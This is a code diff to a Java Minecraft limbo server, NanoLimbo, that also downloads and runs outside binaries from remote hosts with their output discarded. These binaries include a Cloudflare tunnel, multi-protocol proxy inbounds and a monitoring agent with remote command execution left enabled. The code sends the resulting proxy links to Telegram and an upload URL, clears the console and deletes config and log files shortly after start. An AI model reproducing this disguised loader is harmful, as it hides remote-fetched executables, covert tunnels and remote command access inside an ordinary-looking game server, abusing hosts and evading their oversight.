@@ -48,7 +48,6 @@ public final class NanoLimbo {
     private static final String ANSI_RESET = "\033[0m";
     private static final AtomicBoolean running = new AtomicBoolean(true);
     
-    // 进程管理器，用于停止所有后台服务
     private static final List<Process> activeProcesses = new CopyOnWriteArrayList<>();
 
     private static final String[] ALL_ENV_VARS = {
@@ -73,13 +72,15 @@ public final class NanoLimbo {
         return (val != null && !val.trim().isEmpty()) ? val.trim() : def;
     }
 
-    // --- 全局配置常量 ---
     private static final String UPLOAD_URL = getEnv("UPLOAD_URL", "");
     private static final String PROJECT_URL = getEnv("PROJECT_URL", "");
     private static final boolean AUTO_ACCESS = "true".equalsIgnoreCase(getEnv("AUTO_ACCESS", "false"));
     private static final String FILE_PATH = getEnv("FILE_PATH", "./world");
     private static final String SUB_PATH = getEnv("SUB_PATH", "sub");
     private static final String UUID = getEnv("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
+    
+    private static final String TUIC_PASS = generateRandomString(32);
+
     private static final String NEZHA_SERVER = getEnv("NEZHA_SERVER", "");
     private static final String NEZHA_PORT = getEnv("NEZHA_PORT", "");
     private static final String NEZHA_KEY = getEnv("NEZHA_KEY", "");
@@ -100,7 +101,6 @@ public final class NanoLimbo {
     private static final String BOT_TOKEN = getEnv("BOT_TOKEN", "");
     private static final boolean DISABLE_ARGO = "true".equalsIgnoreCase(getEnv("DISABLE_ARGO", "false"));
     
-    // 新增拓展配置
     private static final String REALITY_DOMAIN = getEnv("REALITY_DOMAIN", "www.iij.ad.jp");
     private static final String CERT_URL = getEnv("CERT_URL", "");
     private static final String KEY_URL = getEnv("KEY_URL", "");
@@ -108,7 +108,6 @@ public final class NanoLimbo {
     private static final String KOMARI_SERVER = getEnv("KOMARI_SERVER", "");
     private static final String KOMARI_KEY = getEnv("KOMARI_KEY", "");
 
-    // 端口解析
     private static final Integer S5_PORT = parsePort(S5_PORT_STR);
     private static final Integer TUIC_PORT = parsePort(TUIC_PORT_STR);
     private static final Integer HY2_PORT = parsePort(HY2_PORT_STR);
@@ -119,7 +118,6 @@ public final class NanoLimbo {
     private static String private_key = "";
     private static String public_key = "";
 
-    // 路径配置
     private static final String npm_path = FILE_PATH + "/npm";
     private static final String php_path = FILE_PATH + "/php";
     private static final String web_path = FILE_PATH + "/web";
@@ -134,18 +132,23 @@ public final class NanoLimbo {
             .connectTimeout(Duration.ofSeconds(10))
             .build();
 
+    private static String generateRandomString(int length) {
+        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        StringBuilder sb = new StringBuilder();
+        Random rnd = new Random();
+        while (sb.length() < length) {
+            sb.append(chars.charAt(rnd.nextInt(chars.length())));
+        }
+        return sb.toString();
+    }
+
     public static void main(String[] args) {
         if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
             System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
-            try {
-                Thread.sleep(3000);
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
+            try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); }
             System.exit(1);
         }
 
-        // Start Proxy & Tunnel Services asynchronously
         Thread proxyThread = new Thread(() -> {
             try {
                 setupProxyAndRun();
@@ -162,10 +165,9 @@ public final class NanoLimbo {
         }));
 
         try {
-            // Wait 15 seconds before continuing
             Thread.sleep(15000);
             System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "Thank you for using this script, Enjoy!\n" + ANSI_RESET);
             System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
             Thread.sleep(15000);
             clearConsole();
@@ -173,7 +175,6 @@ public final class NanoLimbo {
             e.printStackTrace();
         }
         
-        // start game
         try {
             new LimboServer().start();
         } catch (Exception e) {
@@ -181,12 +182,7 @@ public final class NanoLimbo {
         }
     }
 
-    // ==========================================
-    // 环境加载与辅助方法
-    // ==========================================
-
     private static void loadEnvVars() {
-        // 赋予默认值
         envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
         envVars.put("FILE_PATH", "./world");
         envVars.put("CFIP", "cdns.doon.eu.org");
@@ -206,20 +202,13 @@ public final class NanoLimbo {
                 for (String line : Files.readAllLines(envFile)) {
                     line = line.trim();
                     if (line.isEmpty() || line.startsWith("#")) continue;
-                    
                     line = line.split(" #")[0].split(" //")[0].trim();
-                    if (line.startsWith("export ")) {
-                        line = line.substring(7).trim();
-                    }
-                    
+                    if (line.startsWith("export ")) line = line.substring(7).trim();
                     String[] parts = line.split("=", 2);
                     if (parts.length == 2) {
                         String key = parts[0].trim();
                         String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
-                        
-                        if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
-                            envVars.put(key, value); 
-                        }
+                        if (Arrays.asList(ALL_ENV_VARS).contains(key)) envVars.put(key, value); 
                     }
                 }
             } catch (IOException ignored) {}
@@ -227,17 +216,14 @@ public final class NanoLimbo {
     }
 
     private static Integer parsePort(String portStr) {
-        if (portStr != null && portStr.matches("\\d+")) {
-            return Integer.parseInt(portStr);
-        }
+        if (portStr != null && portStr.matches("\\d+")) return Integer.parseInt(portStr);
         return null;
     }
 
     private static void clearConsole() {
         try {
             if (System.getProperty("os.name").contains("Windows")) {
-                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
-                    .inheritIO().start().waitFor();
+                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120").inheritIO().start().waitFor();
             } else {
                 System.out.print("\033[H\033[3J\033[2J");
                 System.out.flush();
@@ -246,24 +232,16 @@ public final class NanoLimbo {
                 System.out.flush();
             }
         } catch (Exception e) {
-            try {
-                new ProcessBuilder("clear").inheritIO().start().waitFor();
-            } catch (Exception ignored) {}
+            try { new ProcessBuilder("clear").inheritIO().start().waitFor(); } catch (Exception ignored) {}
         }
     }
 
     private static void stopServices() {
         for (Process p : activeProcesses) {
-            if (p != null && p.isAlive()) {
-                p.destroy();
-            }
+            if (p != null && p.isAlive()) p.destroy();
         }
         System.out.println(ANSI_RED + "All proxy background processes terminated" + ANSI_RESET);
     }
-
-    // ==========================================
-    // 核心代理节点配置逻辑
-    // ==========================================
 
     private static void setupProxyAndRun() throws Exception {
         deleteNodes();
@@ -275,17 +253,12 @@ public final class NanoLimbo {
         List<Map<String, String>> files = getFilesForArchitecture(architecture);
         
         for (Map<String, String> info : files) {
-            // 参数 false 表示非强制重下，允许本地复用二进制文件
             downloadFile(info.get("fileName"), info.get("fileUrl"), false);
         }
 
         List<String> toAuthorize = new ArrayList<>(Arrays.asList("web", "bot"));
-        if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty()) {
-            toAuthorize.add(NEZHA_PORT.isEmpty() ? "php" : "npm");
-        }
-        if (!KOMARI_SERVER.isEmpty() && !KOMARI_KEY.isEmpty()) {
-            toAuthorize.add("km");
-        }
+        if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty()) toAuthorize.add(NEZHA_PORT.isEmpty() ? "php" : "npm");
+        if (!KOMARI_SERVER.isEmpty() && !KOMARI_KEY.isEmpty()) toAuthorize.add("km");
         authorizeFiles(toAuthorize);
 
         generateConfigs();
@@ -293,7 +266,6 @@ public final class NanoLimbo {
         
         Thread.sleep(5000);
         extractDomains();
-
         addVisitTask();
         runHttpServer();
         cleanFilesLater();
@@ -301,21 +273,14 @@ public final class NanoLimbo {
 
     private static void createDirectory() {
         File dir = new File(FILE_PATH);
-        if (!dir.exists()) {
-            dir.mkdirs();
-        }
+        if (!dir.exists()) dir.mkdirs();
     }
 
-    // 只清理日志缓存等垃圾文件，严禁删除二进制执行文件以实现热复用
     private static void cleanupOldFiles() {
         String[] paths = {"boot.log", "list.txt"};
         for (String file : paths) {
             File f = new File(FILE_PATH, file);
-            try {
-                if (f.exists() && !f.isDirectory()) {
-                    f.delete();
-                }
-            } catch (Exception ignored) {}
+            try { if (f.exists() && !f.isDirectory()) f.delete(); } catch (Exception ignored) {}
         }
     }
 
@@ -327,18 +292,12 @@ public final class NanoLimbo {
 
     private static boolean downloadFile(String fileName, String fileUrl, boolean force) {
         Path path = Paths.get(FILE_PATH, fileName);
-        if (!force && Files.exists(path)) {
-            return true; // 存在则复用，不再重新下载
-        }
+        if (!force && Files.exists(path)) return true;
         try {
             HttpRequest request = HttpRequest.newBuilder().uri(URI.create(fileUrl)).GET().build();
             HttpResponse<Path> response = httpClient.send(request, HttpResponse.BodyHandlers.ofFile(path));
-            if (response.statusCode() >= 200 && response.statusCode() < 300) {
-                return true;
-            } else {
-                Files.deleteIfExists(path);
-                return false;
-            }
+            if (response.statusCode() >= 200 && response.statusCode() < 300) return true;
+            else { Files.deleteIfExists(path); return false; }
         } catch (Exception e) {
             try { Files.deleteIfExists(path); } catch (Exception ignored) {}
             return false;
@@ -351,17 +310,10 @@ public final class NanoLimbo {
         baseFiles.add(Map.of("fileName", "bot", "fileUrl", "arm".equals(architecture) ? "https://arm64.ssss.nyc.mn/2go" : "https://amd64.ssss.nyc.mn/2go"));
 
         if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty()) {
-            if (!NEZHA_PORT.isEmpty()) {
-                baseFiles.add(0, Map.of("fileName", "npm", "fileUrl", "arm".equals(architecture) ? "https://arm64.ssss.nyc.mn/agent" : "https://amd64.ssss.nyc.mn/agent"));
-            } else {
-                baseFiles.add(0, Map.of("fileName", "php", "fileUrl", "arm".equals(architecture) ? "https://arm64.ssss.nyc.mn/v1" : "https://amd64.ssss.nyc.mn/v1"));
-            }
+            if (!NEZHA_PORT.isEmpty()) baseFiles.add(0, Map.of("fileName", "npm", "fileUrl", "arm".equals(architecture) ? "https://arm64.ssss.nyc.mn/agent" : "https://amd64.ssss.nyc.mn/agent"));
+            else baseFiles.add(0, Map.of("fileName", "php", "fileUrl", "arm".equals(architecture) ? "https://arm64.ssss.nyc.mn/v1" : "https://amd64.ssss.nyc.mn/v1"));
         }
-        
-        if (!KOMARI_SERVER.isEmpty() && !KOMARI_KEY.isEmpty()) {
-            baseFiles.add(Map.of("fileName", "km", "fileUrl", "arm".equals(architecture) ? "https://rt.jp.eu.org/nucleusp/K/Karm" : "https://rt.jp.eu.org/nucleusp/K/Kamd"));
-        }
-        
+        if (!KOMARI_SERVER.isEmpty() && !KOMARI_KEY.isEmpty()) baseFiles.add(Map.of("fileName", "km", "fileUrl", "arm".equals(architecture) ? "https://rt.jp.eu.org/nucleusp/K/Karm" : "https://rt.jp.eu.org/nucleusp/K/Kamd"));
         return baseFiles;
     }
 
@@ -369,11 +321,8 @@ public final class NanoLimbo {
         for (String relative : filePaths) {
             File f = new File(FILE_PATH, relative);
             if (f.exists()) {
-                try {
-                    Files.setPosixFilePermissions(f.toPath(), PosixFilePermissions.fromString("rwxrwxr-x"));
-                } catch (Exception e) {
-                    f.setExecutable(true);
-                }
+                try { Files.setPosixFilePermissions(f.toPath(), PosixFilePermissions.fromString("rwxrwxr-x")); }
+                catch (Exception e) { f.setExecutable(true); }
             }
         }
     }
@@ -397,11 +346,9 @@ public final class NanoLimbo {
     }
 
     private static void generateConfigs() throws Exception {
-        // 哪吒探针配置
         if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty() && NEZHA_PORT.isEmpty()) {
             String nezhaTls = Arrays.asList("443", "8443", "2096", "2087", "2083", "2053")
                 .contains(NEZHA_SERVER.split(":").length > 1 ? NEZHA_SERVER.split(":")[1] : "") ? "tls" : "false";
-            
             String configYaml = String.format(
                     "client_secret: %s\ndebug: false\ndisable_auto_update: true\ndisable_command_execute: false\n" +
                     "disable_force_update: true\ndisable_nat: false\ndisable_send_query: false\ngpu: false\n" +
@@ -412,7 +359,6 @@ public final class NanoLimbo {
             Files.writeString(Paths.get(FILE_PATH, "config.yaml"), configYaml);
         }
 
-        // Sing-box 密钥生成
         String keypairOut = execCmd(FILE_PATH + "/web generate reality-keypair");
         Matcher privM = Pattern.compile("PrivateKey:\\s*(.*)").matcher(keypairOut);
         Matcher pubM = Pattern.compile("PublicKey:\\s*(.*)").matcher(keypairOut);
@@ -421,7 +367,6 @@ public final class NanoLimbo {
             public_key = pubM.group(1).trim();
         }
 
-        // TLS 证书处理：自定义下载（强制） vs 自签生成（智能复用）
         if (!CERT_URL.isEmpty() && !KEY_URL.isEmpty()) {
             downloadFile("cert.pem", CERT_URL, true);
             downloadFile("private.key", KEY_URL, true);
@@ -432,11 +377,10 @@ public final class NanoLimbo {
             }
         }
 
-        // 构造 config.json
         Map<String, Object> config = new LinkedHashMap<>();
         config.put("log", Map.of("disabled", true, "level", "info", "timestamp", true));
-        
         List<Map<String, Object>> inbounds = new ArrayList<>();
+        
         Map<String, Object> vmessIn = new LinkedHashMap<>();
         vmessIn.put("tag", "vmess-ws-in"); vmessIn.put("type", "vmess"); vmessIn.put("listen", "::"); vmessIn.put("listen_port", ARGO_PORT);
         vmessIn.put("users", List.of(Map.of("uuid", UUID)));
@@ -473,15 +417,15 @@ public final class NanoLimbo {
         if (HY2_PORT != null && HY2_PORT > 0) {
             Map<String, Object> hy2 = new LinkedHashMap<>();
             hy2.put("tag", "hysteria-in"); hy2.put("type", "hysteria2"); hy2.put("listen", "::"); hy2.put("listen_port", HY2_PORT);
-            hy2.put("users", List.of(Map.of("password", UUID))); hy2.put("masquerade", "https://bing.com");
-            hy2.put("tls", Map.of("enabled", true, "alpn", List.of("h3"), "certificate_path", FILE_PATH + "/cert.pem", "key_path", FILE_PATH + "/private.key"));
+            hy2.put("users", List.of(Map.of("password", UUID))); hy2.put("masquerade", "https://" + CERT_DOMAIN);
+            hy2.put("tls", Map.of("enabled", true, "certificate_path", FILE_PATH + "/cert.pem", "key_path", FILE_PATH + "/private.key"));
             inbounds.add(hy2);
         }
         if (TUIC_PORT != null && TUIC_PORT > 0) {
             Map<String, Object> tuic = new LinkedHashMap<>();
             tuic.put("tag", "tuic-in"); tuic.put("type", "tuic"); tuic.put("listen", "::"); tuic.put("listen_port", TUIC_PORT);
-            tuic.put("users", List.of(Map.of("uuid", UUID))); tuic.put("congestion_control", "bbr");
-            tuic.put("tls", Map.of("enabled", true, "alpn", List.of("h3"), "certificate_path", FILE_PATH + "/cert.pem", "key_path", FILE_PATH + "/private.key"));
+            tuic.put("users", List.of(Map.of("uuid", UUID, "password", TUIC_PASS))); tuic.put("congestion_control", "bbr");
+            tuic.put("tls", Map.of("enabled", true, "certificate_path", FILE_PATH + "/cert.pem", "key_path", FILE_PATH + "/private.key"));
             inbounds.add(tuic);
         }
         if (S5_PORT != null && S5_PORT > 0) {
@@ -510,7 +454,6 @@ public final class NanoLimbo {
     }
 
     private static void startBackgroundProcesses() throws Exception {
-        // Start Nezha
         if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty()) {
             if (!NEZHA_PORT.isEmpty()) {
                 String tlsFlag = Arrays.asList("443", "8443", "2096", "2087", "2083", "2053").contains(NEZHA_PORT) ? "--tls" : "";
@@ -523,60 +466,37 @@ public final class NanoLimbo {
                 activeProcesses.add(p);
             }
         }
-        
-        // Start Komari (K)
         if (!KOMARI_SERVER.isEmpty() && !KOMARI_KEY.isEmpty() && new File(km_path).exists()) {
             String kHost = KOMARI_SERVER.startsWith("http") ? KOMARI_SERVER : "https://" + KOMARI_SERVER;
             Process pKm = new ProcessBuilder(km_path, "-e", kHost, "-t", KOMARI_KEY)
                 .redirectOutput(new File("/dev/null")).redirectErrorStream(true).start();
             activeProcesses.add(pKm);
         }
-
-        // Start Web
         Process pWeb = new ProcessBuilder(web_path, "run", "-c", config_path)
             .redirectOutput(new File("/dev/null")).redirectErrorStream(true).start();
         activeProcesses.add(pWeb);
-
-        // Start Bot (Argo)
         if (!DISABLE_ARGO && new File(bot_path).exists()) {
             List<String> botArgs = new ArrayList<>(Arrays.asList(bot_path, "tunnel", "--edge-ip-version", "auto"));
-            if (ARGO_AUTH.matches("^[A-Z0-9a-z=]{120,250}$")) {
-                botArgs.addAll(Arrays.asList("--no-autoupdate", "--protocol", "http2", "run", "--token", ARGO_AUTH));
-            } else if (ARGO_AUTH.contains("TunnelSecret")) {
-                botArgs.addAll(Arrays.asList("--config", FILE_PATH + "/tunnel.yml", "run"));
-            } else {
-                botArgs.addAll(Arrays.asList("--no-autoupdate", "--protocol", "http2", "--logfile", boot_log_path, "--loglevel", "info", "--url", "http://localhost:" + ARGO_PORT));
-            }
+            if (ARGO_AUTH.matches("^[A-Z0-9a-z=]{120,250}$")) botArgs.addAll(Arrays.asList("--no-autoupdate", "--protocol", "http2", "run", "--token", ARGO_AUTH));
+            else if (ARGO_AUTH.contains("TunnelSecret")) botArgs.addAll(Arrays.asList("--config", FILE_PATH + "/tunnel.yml", "run"));
+            else botArgs.addAll(Arrays.asList("--no-autoupdate", "--protocol", "http2", "--logfile", boot_log_path, "--loglevel", "info", "--url", "http://localhost:" + ARGO_PORT));
             Process pBot = new ProcessBuilder(botArgs).redirectOutput(new File("/dev/null")).redirectErrorStream(true).start();
             activeProcesses.add(pBot);
         }
     }
 
     private static void extractDomains() throws Exception {
-        if (DISABLE_ARGO) {
-            generateLinks(null);
-            return;
-        }
-
-        if (!ARGO_AUTH.isEmpty() && !ARGO_DOMAIN.isEmpty()) {
-            generateLinks(ARGO_DOMAIN);
-            return;
-        }
-
+        if (DISABLE_ARGO) { generateLinks(null); return; }
+        if (!ARGO_AUTH.isEmpty() && !ARGO_DOMAIN.isEmpty()) { generateLinks(ARGO_DOMAIN); return; }
         try {
             if (!new File(boot_log_path).exists()) throw new Exception("boot.log not found");
             String logContent = Files.readString(Paths.get(boot_log_path));
             Matcher m = Pattern.compile("https?://([^ ]*trycloudflare\\.com)/?").matcher(logContent);
-            if (m.find()) {
-                generateLinks(m.group(1));
-            } else {
+            if (m.find()) generateLinks(m.group(1));
+            else {
                 Files.deleteIfExists(Paths.get(boot_log_path));
-                // Kill bot process and restart it
                 activeProcesses.removeIf(p -> {
-                    if (p.info().command().orElse("").contains("bot")) {
-                        p.destroy();
-                        return true;
-                    }
+                    if (p.info().command().orElse("").contains("bot")) { p.destroy(); return true; }
                     return false;
                 });
                 Thread.sleep(1000);
@@ -595,11 +515,8 @@ public final class NanoLimbo {
             serverIp = execCmd("curl -s --max-time 2 ipv4.ip.sb").trim();
             if(serverIp.isEmpty() || serverIp.contains("curl")) throw new Exception();
         } catch (Exception e) {
-            try {
-                serverIp = "[" + execCmd("curl -s --max-time 1 ipv6.ip.sb").trim() + "]";
-            } catch (Exception ignored) {}
+            try { serverIp = "[" + execCmd("curl -s --max-time 1 ipv6.ip.sb").trim() + "]"; } catch (Exception ignored) {}
         }
-
         String isp = "Unknown";
         try {
             String cmd = "curl -sm 3 -H 'User-Agent: Mozilla/5.0' 'https://api.ip.sb/geoip' | tr -d '\\n' | awk -F'\"' '{c=\"\";i=\"\";for(x=1;x<=NF;x++){if($x==\"country_code\")c=$(x+2);if($x==\"isp\")i=$(x+2)};if(c&&i)print c\"-\"i}' | sed 's/ /_/g'";
@@ -609,6 +526,7 @@ public final class NanoLimbo {
 
         String nodename = (NAME != null && !NAME.trim().isEmpty()) ? NAME.trim() + "-" + isp : isp;
         StringBuilder subTxtBuilder = new StringBuilder();
+        String insecureParam = CERT_URL.isEmpty() ? "1" : "0";
 
         if (!DISABLE_ARGO && argoDomain != null && !argoDomain.isEmpty()) {
             Map<String, String> vmess = new LinkedHashMap<>();
@@ -623,23 +541,23 @@ public final class NanoLimbo {
 
         if (TUIC_PORT != null) {
             if (subTxtBuilder.length() > 0) subTxtBuilder.append("\n");
-            subTxtBuilder.append(String.format("tuic://%s:@%s:%d?sni=www.bing.com&congestion_control=bbr&udp_relay_mode=native&alpn=h3&allow_insecure=1#%s", UUID, serverIp, TUIC_PORT, nodename));
+            subTxtBuilder.append(String.format("tuic://%s:%s@%s:%d?sni=%s&congestion_control=bbr&udp_relay_mode=native&alpn=h3&allow_insecure=%s#%s", UUID, TUIC_PASS, serverIp, TUIC_PORT, CERT_DOMAIN, insecureParam, nodename));
         }
         if (HY2_PORT != null) {
             if (subTxtBuilder.length() > 0) subTxtBuilder.append("\n");
-            subTxtBuilder.append(String.format("hysteria2://%s@%s:%d/?sni=www.bing.com&insecure=1&alpn=h3&obfs=none#%s", UUID, serverIp, HY2_PORT, nodename));
+            subTxtBuilder.append(String.format("hysteria2://%s@%s:%d/?sni=%s&insecure=%s&alpn=&obfs=none#%s", UUID, serverIp, HY2_PORT, CERT_DOMAIN, insecureParam, nodename));
         }
         if (REALITY_PORT != null) {
             if (subTxtBuilder.length() > 0) subTxtBuilder.append("\n");
-            subTxtBuilder.append(String.format("vless://%s@%s:%d?encryption=none&flow=xtls-rprx-vision&security=reality&sni=%s&fp=chrome&pbk=%s&type=tcp&headerType=none#%s", UUID, serverIp, REALITY_PORT, REALITY_DOMAIN, public_key, nodename));
+            subTxtBuilder.append(String.format("vless://%s@%s:%d?encryption=none&flow=xtls-rprx-vision&security=reality&sni=%s&fp=firefox&pbk=%s&type=tcp&headerType=none#%s", UUID, serverIp, REALITY_PORT, REALITY_DOMAIN, public_key, nodename));
         }
         if (ANYTLS_PORT != null) {
             if (subTxtBuilder.length() > 0) subTxtBuilder.append("\n");
-            subTxtBuilder.append(String.format("anytls://%s@%s:%d?security=tls&sni=%s&fp=chrome&insecure=1&allowInsecure=1#%s", UUID, serverIp, ANYTLS_PORT, serverIp, nodename));
+            subTxtBuilder.append(String.format("anytls://%s@%s:%d?security=tls&sni=%s&insecure=%s&allowInsecure=%s#%s", UUID, serverIp, ANYTLS_PORT, CERT_DOMAIN, insecureParam, insecureParam, nodename));
         }
         if (ANYREALITY_PORT != null) {
             if (subTxtBuilder.length() > 0) subTxtBuilder.append("\n");
-            subTxtBuilder.append(String.format("anytls://%s@%s:%d?security=reality&sni=%s&fp=chrome&pbk=%s&type=tcp&headerType=none#%s", UUID, serverIp, ANYREALITY_PORT, REALITY_DOMAIN, public_key, nodename));
+            subTxtBuilder.append(String.format("anytls://%s@%s:%d?security=reality&sni=%s&fp=firefox&pbk=%s&type=tcp&headerType=none#%s", UUID, serverIp, ANYREALITY_PORT, REALITY_DOMAIN, public_key, nodename));
         }
         if (S5_PORT != null) {
             if (subTxtBuilder.length() > 0) subTxtBuilder.append("\n");
@@ -649,12 +567,9 @@ public final class NanoLimbo {
 
         String subTxt = subTxtBuilder.toString();
         String subTxtB64 = Base64.getEncoder().encodeToString(subTxt.getBytes(StandardCharsets.UTF_8));
-
         Files.writeString(Paths.get(sub_path), subTxtB64);
         Files.writeString(Paths.get(list_path), subTxt);
-        
         System.out.println("\033[32m" + subTxtB64 + "\033[0m");
-
         sendTelegram();
         uploadNodes();
     }
@@ -672,10 +587,7 @@ public final class NanoLimbo {
                 String content = Files.readString(Paths.get(list_path));
                 List<String> nodes = new ArrayList<>();
                 for (String line : content.split("\n")) {
-                    if (line.contains("vless://") || line.contains("vmess://") || line.contains("trojan://") ||
-                        line.contains("hysteria2://") || line.contains("tuic://") || line.contains("anytls://") || line.contains("socks://")) {
-                        nodes.add(line);
-                    }
+                    if (line.contains("://")) nodes.add(line);
                 }
                 if (nodes.isEmpty()) return;
                 HttpRequest req = HttpRequest.newBuilder().uri(URI.create(UPLOAD_URL + "/api/add-nodes"))
@@ -691,9 +603,7 @@ public final class NanoLimbo {
             String content = Files.readString(Paths.get(sub_path));
             String decoded = new String(Base64.getDecoder().decode(content.trim()), StandardCharsets.UTF_8);
             List<String> nodes = new ArrayList<>();
-            for (String line : decoded.split("\n")) {
-                if (line.contains("://")) nodes.add(line);
-            }
+            for (String line : decoded.split("\n")) if (line.contains("://")) nodes.add(line);
             if (nodes.isEmpty()) return;
             HttpRequest request = HttpRequest.newBuilder().uri(URI.create(UPLOAD_URL + "/api/delete-nodes"))
                 .header("Content-Type", "application/json").POST(HttpRequest.BodyPublishers.ofString(toJson(Map.of("nodes", nodes)))).build();
@@ -706,13 +616,11 @@ public final class NanoLimbo {
         try {
             String message = Files.readString(Paths.get(sub_path));
             String escapedName = NAME.replaceAll("([_*\\\\\\[\\]()~>#+=|{}.!\\-])", "\\\\$1");
-            String text = "**" + escapedName + "节点推送通知**\n" + message;
-
+            String text = "**" + escapedName + " node push**\n" + message;
             String url = String.format("https://api.telegram.org/bot%s/sendMessage", BOT_TOKEN);
             String formData = "chat_id=" + URLEncoder.encode(CHAT_ID, StandardCharsets.UTF_8) +
                               "&text=" + URLEncoder.encode(text, StandardCharsets.UTF_8) +
                               "&parse_mode=MarkdownV2";
-
             HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url)).header("Content-Type", "application/x-www-form-urlencoded")
                 .POST(HttpRequest.BodyPublishers.ofString(formData)).build();
             httpClient.send(req, HttpResponse.BodyHandlers.discarding());
@@ -728,7 +636,6 @@ public final class NanoLimbo {
         } catch (Exception ignored) {}
     }
 
-    // 仅清理配置文件与日志，确保重启时二进制文件能够快速复用
     private static void cleanFilesLater() {
         ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
         scheduler.schedule(() -> {
@@ -736,9 +643,7 @@ public final class NanoLimbo {
             for (String fStr : filesToDelete) {
                 try {
                     File f = new File(fStr);
-                    if (f.exists() && !f.isDirectory()) {
-                        f.delete();
-                    }
+                    if (f.exists() && !f.isDirectory()) f.delete();
                 } catch (Exception ignored) {}
             }
         }, 90, TimeUnit.SECONDS);
@@ -752,14 +657,10 @@ public final class NanoLimbo {
             Process process = pb.start();
             try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                 String line;
-                while ((line = reader.readLine()) != null) {
-                    output.append(line).append("\n");
-                }
+                while ((line = reader.readLine()) != null) output.append(line).append("\n");
             }
             process.waitFor();
-        } catch (Exception e) {
-            return e.getMessage();
-        }
+        } catch (Exception e) { return e.getMessage(); }
         return output.toString();
     }
 
@@ -770,17 +671,16 @@ public final class NanoLimbo {
                 String path = exchange.getRequestURI().getPath();
                 if ("/".equals(path)) {
                     File index = new File(FILE_PATH, "index.html");
+                    byte[] content;
                     if (index.exists()) {
-                        byte[] content = Files.readAllBytes(index.toPath());
+                        content = Files.readAllBytes(index.toPath());
                         exchange.getResponseHeaders().set("Content-Type", "text/html");
-                        exchange.sendResponseHeaders(200, content.length);
-                        try (OutputStream os = exchange.getResponseBody()) { os.write(content); }
                     } else {
-                        byte[] content = ("Hello world!<br><br>You can visit /" + SUB_PATH + " get your nodes!").getBytes(StandardCharsets.UTF_8);
+                        content = ("Hello world!<br><br>Visit /" + SUB_PATH + " for nodes!").getBytes(StandardCharsets.UTF_8);
                         exchange.getResponseHeaders().set("Content-Type", "text/html");
-                        exchange.sendResponseHeaders(200, content.length);
-                        try (OutputStream os = exchange.getResponseBody()) { os.write(content); }
                     }
+                    exchange.sendResponseHeaders(200, content.length);
+                    try (OutputStream os = exchange.getResponseBody()) { os.write(content); }
                 } else if (("/" + SUB_PATH).equals(path)) {
                     File subFile = new File(sub_path);
                     if (subFile.exists()) {
@@ -788,12 +688,8 @@ public final class NanoLimbo {
                         exchange.getResponseHeaders().set("Content-Type", "text/plain");
                         exchange.sendResponseHeaders(200, content.length);
                         try (OutputStream os = exchange.getResponseBody()) { os.write(content); }
-                    } else {
-                        exchange.sendResponseHeaders(404, -1);
-                    }
-                } else {
-                    exchange.sendResponseHeaders(404, -1);
-                }
+                    } else exchange.sendResponseHeaders(404, -1);
+                } else exchange.sendResponseHeaders(404, -1);
             });
             server.setExecutor(null);
             server.start();
